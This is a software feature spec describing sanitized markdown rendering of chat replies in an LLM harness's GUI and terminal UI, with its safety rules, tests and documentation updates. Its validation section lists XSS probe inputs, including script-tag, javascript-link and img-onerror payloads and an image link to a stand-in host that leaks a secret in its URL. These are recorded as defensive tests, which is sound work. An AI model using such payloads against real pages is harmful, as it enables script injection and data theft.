---
title: Markdown rendering of assistant replies
kind: feature
status: done
version: 1
updated: 2026-10-27
branch: none
---

## Problem / Motivation

The user's words: "in the chat, I need markdown to be rendered; for rendering use a library that allows markdown extensions".

Before this work, model output was shown as plain text in every front end, and the constitution said so: model output is never HTML or markdown. This feature REPLACES that rule. Assistant replies are now rendered as markdown in the web GUI and in the terminal UI, and the safety rules around untrusted model text are kept and made stricter where markdown opens new risks (raw HTML, links, images).

Decisions by the user: markdown is rendered in the chat; the renderer must be a library that allows markdown extensions.

## Acceptance Criteria

Rendering (GUI and terminal UI unless stated):

1. CommonMark renders: emphasis, lists, block quotes, headings, inline and fenced code.
2. Extensions render: tables, strikethrough, links written as bare URLs (linkify). Task lists and footnotes render in the GUI only (see 14).
3. Fenced code with a known language is highlighted with Pygments in the GUI; an unknown language, or code longer than 20,000 characters, is shown as escaped plain code.
4. The list of extensions lives in one tuple, `_EXTENSIONS` in `src/llm_harness/markdown_render.py`; adding an extension is a one-line change.

Safety:

5. Raw HTML in the source is not interpreted (`html=False`): `<b>x</b>` and `<script>alert(1)</script>` are shown as literal text.
6. Images are never rendered: an image becomes its escaped alt text, with no `img` element and no URL in the output. (An injected image URL could leak the conversation.)
7. The GUI pipeline is `sanitize_text` -> `render_html` -> `sanitize_html` -> `ui.html(content, sanitize=sanitize_html)`. `ui.markdown` is not used, and `sanitize=True` or `sanitize=False` is never passed.
8. The `sanitize_html` allowlist: tags `p, br, hr, h1-h6, strong, em, s, del, code, pre, blockquote, ul, ol, li, input, a, table, thead, tbody, tr, th, td, sup, section, div, span`. No `script`, `style`, `iframe`, `object`, `embed`, `form`, `svg` or `img`, and no `style` attribute.
9. Attributes: `class` only on `code, pre, span, div, sup, section, li` with the characters `[A-Za-z0-9_-]` (space separated); `id` only on `a` and `li`, only for footnote ids; `input` only as a disabled checkbox.
10. Links: `href` only with `http`, `https`, `mailto` or a `#fragment`; `[x](javascript:alert(1))` yields no anchor. Every external link carries `rel="noopener noreferrer"` and `target="_blank"`; a fragment (footnote) link carries `rel` but no `target`.
11. `sanitize_text` still removes ESC, control characters and bidi overrides before rendering.
12. Thinking text, the usage line, error lines, notes and the echoed user text stay plain text (`ui.label` in the GUI, `Static(markup=False)` in the terminal UI). `--plain` stays plain text.
13. No configuration key was added.

Terminal UI limits:

14. The terminal UI uses Textual's `Markdown` widget with `parser_factory=parser_factory` and `open_links=False`. Task lists and footnotes are not supported there and show as literal text, because the two plugins are left out of the terminal parser.

Tests:

15. The tests pass offline, including an XSS suite for the sanitizer and a sanitizer-only test for images.

## Approach

Memory consulted: NiceGUI|Textual|uvicorn|sanitize|markdown (case-insensitive) — 3 relevant entries (NiceGUI `ui.run` and `on_delete`; Textual 8.2 markup parsing of `str` content; google-genai and aiohttp), none about markdown rendering.

Chosen design: a new module `src/llm_harness/markdown_render.py` on markdown-it-py 4.2.0 with mdit-py-plugins 0.6.1.

- Parser: `MarkdownIt("commonmark", {"html": False, "linkify": True, "highlight": ...})` plus the `_EXTENSIONS` tuple: `MarkdownIt.enable` for `table`, `strikethrough` and `linkify`, then `tasklists_plugin` and `footnote_plugin`. `linkify` needs linkify-it-py 2.2.0, which is installed as a transitive dependency and is not declared in `pyproject.toml`.
- Code: Pygments 2.21.0 `HtmlFormatter(nowrap=True)`; `_MAX_HIGHLIGHT_CHARS = 20_000`; an unknown lexer returns "" so markdown-it escapes the code as plain.
- Images: a render rule for `image` returns the escaped alt text.
- GUI: `render_html` output goes through `sanitize_html` (nh3 0.3.7, an allowlist, cleaned twice because ammonia's output for a link whose `href` was dropped is not idempotent after one pass) and `ui.html(..., sanitize=sanitize_html)`. NiceGUI applies a callable `sanitize` on the server before `innerHTML`; only `sanitize=True` triggers the browser's DOMPurify. So our allowlist is the only filter, and that is why a callable is passed and `True`/`False` never are.
- Fragment links: ammonia can only set `target` on every link, so `_drop_target_on_fragment_links` removes `target` from anchors whose `href` starts with `#`, so a footnote link scrolls the page and does not open a second chat session in a new tab.
- Terminal UI: Textual's `Markdown` widget gets `parser_factory`, which builds the same parser without `tasklists_plugin` and `footnote_plugin` (`_TEXTUAL_UNSUPPORTED`). Reasons: the checkbox is raw inline HTML that Textual drops, and Textual raises `IndexError` on footnote tokens (reproduced by the coordinator). Textual only calls `parser.parse`, so the Pygments `highlight` option is not used there (`textual/widgets/_markdown.py` calls `parser.parse(markdown)`); Textual highlights code with its own `textual.highlight`.
- Library choice: markdown-it-py was picked because it supports extension plugins; the `uv add` command added `markdown-it-py`, `mdit-py-plugins`, `pygments` and `nh3`.

Unverified:

- Nothing was looked at in a real browser: the Quasar and Vue rendering, the CSS and the Pygments colours.
- Nothing was looked at in a real terminal.
- The GUI table styling for wide tables and code was not checked visually.

Assumptions:

- Dropping `style` attributes (and with them table column alignment) is acceptable.
- Footnote ids that repeat across replies in one page are acceptable for now.
- The terminal UI may lose task lists and footnotes.

## Affected Areas

- `src/llm_harness/markdown_render.py` (new).
- `src/llm_harness/gui/app.py`: the reply is a `ui.html` with `sanitize=sanitize_html`; the page adds the Pygments CSS.
- `src/llm_harness/tui/app.py`: the reply is a `Markdown` widget.
- `pyproject.toml` and `uv.lock`: four dependencies added.
- Tests: `tests/test_markdown_render.py` (new), `tests/test_gui.py`, `tests/test_tui.py`.
- Docs: `specs/tech-stack.md`, `README.md`, `CHANGELOG.md`, `specs/memory.md`.

## Out of Scope

- Configurable extensions in config files (the list is in code, in one tuple).
- Images of any kind.
- Math and mermaid diagrams.
- Markdown in `--plain`.
- Table column alignment.
- Task lists and footnotes in the terminal UI.

## Implementation Notes

Done:

- `markdown_render.py` exposes `render_html`, `sanitize_html`, `parser_factory` and `pygments_css`.
- Dependencies added with `uv add markdown-it-py mdit-py-plugins pygments nh3`: markdown-it-py 4.2.0, mdit-py-plugins 0.6.1, pygments 2.21.0, nh3 0.3.7 (new in the project).
- Tests changed on purpose: the old GUI test "no html or markdown element holds model text" became two tests (only the reply uses `ui.html`, and with our own sanitizer callable; raw HTML in the reply is literal text); GUI reply assertions now read `innerHTML` (`"Hello"` became `<p>Hello</p>\n`); in the terminal UI the reply is a `Markdown` widget and one expectation changed (a two-line paragraph is joined with a space).
- Known limits: tables lose column alignment; footnote ids repeat across replies; the terminal UI loses task lists and footnotes; `linkify-it-py` is transitive and undeclared.
- A small fix to fragment-link handling was made in parallel with this documentation (`_drop_target_on_fragment_links`); the criteria above describe the code as read at the end of this task.

Process note (a deviation from the /code order): the user's message served as the specification, and this spec file was written after the implementation. The approval gates of `/code` were therefore not run in order for this item.

## Validation

Technical writer's own run (project root, scratch `HOME` and `UV_CACHE_DIR`):

- `uv run ruff check`: All checks passed. `uv run ruff format --check`: 50 files already formatted.
- `uv run pytest -q -rs`: 825 passed, 3 deselected, 0 skipped, 0 failed, one DeprecationWarning from google-genai (22 s). The count is higher than the coordinator's 815 because the parallel engineer added tests while this was written.

Coordinator results: ruff clean (48 files); 815 passed, 3 deselected, 0 skipped (686 earlier plus 129 new, 107 of them in `tests/test_markdown_render.py`).

Coordinator probe through the real pipeline: bold, list, table, highlighted code, task list, strikethrough and autolink render; `<script>alert(1)</script> and <b>x</b>` come out as escaped literal text; `[x](javascript:alert(1))` stays inert plain text with no anchor; `<img src=x onerror=alert(1)>` is escaped text; `![secret](http://evil.example/p.png?q=SECRET)` becomes the text `secret` with no `img` and no URL; ESC and the bidi override are stripped; an autolinked https URL gets `target` and `rel`.

Mutation checks by the engineer (each reverted): `html=True` failed 5 tests; a sanitizer bypass failed the XSS suite; allowing `img` in the sanitizer and the renderer failed 4 tests; allowing `img` only in the sanitizer failed nothing until a sanitizer-only test was added; the terminal UI back to plain `Static` failed many tests.

Not verified: a real browser, a real terminal, and the GUI colours and layout (see Unverified under Approach).

## Documentation Review

Reviewed 2026-10-27 against the current code.

Drift found (before this work's updates):

- `specs/tech-stack.md:77`: "renders it as plain text, with no markup and no raw HTML" is false for assistant replies (`src/llm_harness/gui/app.py:234` `ui.html("", sanitize=sanitize_html)`; `src/llm_harness/tui/app.py:175` `Markdown(...)`). Thinking text, usage, errors and notes stay plain.
- `specs/tech-stack.md:21-26` library list lacks markdown-it-py, mdit-py-plugins, pygments and nh3 (`pyproject.toml` dependencies) and does not list `linkify-it-py` among the undeclared transitive imports.
- `specs/tech-stack.md:61` layout lists the core modules without `markdown_render.py`.
- `README.md:112-113`: "shown as plain text, never as HTML or markdown" is false for replies.
- `README.md:145` and Known limits have nothing about markdown.
- `CHANGELOG.md:16`: "sanitized model output" is still true (text is sanitized) but incomplete; amended to say replies are rendered markdown.
- `specs/mission.md`: grep for `plain text`, `markdown`, `sanitiz` finds nothing; no false sentence, so it was not edited.
- `specs/features/chat-streaming.md` (a closed spec, not edited) still states the plain-text rule in its criterion 18 and notes; they describe the state at that delivery and are superseded by this spec.

CI review: no CI, release or deploy files exist; nothing to update

- {pyproject.toml, needs change: no, it changed only through `uv add` (four dependencies); no hand edit, and the version, scripts and build backend were not touched}.

## Documentation Updates

Done 2026-10-27.

- `specs/tech-stack.md` (version 8; constitution pointer): the rendering rule was replaced by the sanitized-markdown rule; the four libraries and the undeclared `linkify-it-py` were added; a Key convention names `_EXTENSIONS` as the one place for extensions and lists the terminal UI limits; the layout line names `markdown_render.py`.
- `specs/mission.md`: not changed (no false sentence).
- `README.md`: a "Markdown" paragraph; the Security notes sentence about plain text corrected; Known limits extended.
- `CHANGELOG.md`: one `Added` line for markdown rendering; the "Safety features" line amended.
- `specs/memory.md`: three gotchas appended for `ui.html(sanitize=...)`, the Textual `Markdown` widget and nh3 idempotence.

Closeout checklist:

- [x] Spec in the fixed shape, `status: done` (this file).
- [x] Constitution updated: `specs/tech-stack.md` (evidence: grep `markdown_render` in the file).
- [x] README and CHANGELOG updated (evidence: grep `Markdown` in `README.md`, `markdown` in `CHANGELOG.md`).
- [x] Tests and lint run (see Validation).
- [x] Roadmap `## Now` has no line for this item, so nothing to remove.
- [x] Memory entries appended (evidence: `grep -c '^20' specs/memory.md`).
- [x] No version control exists in this directory; nothing was committed.
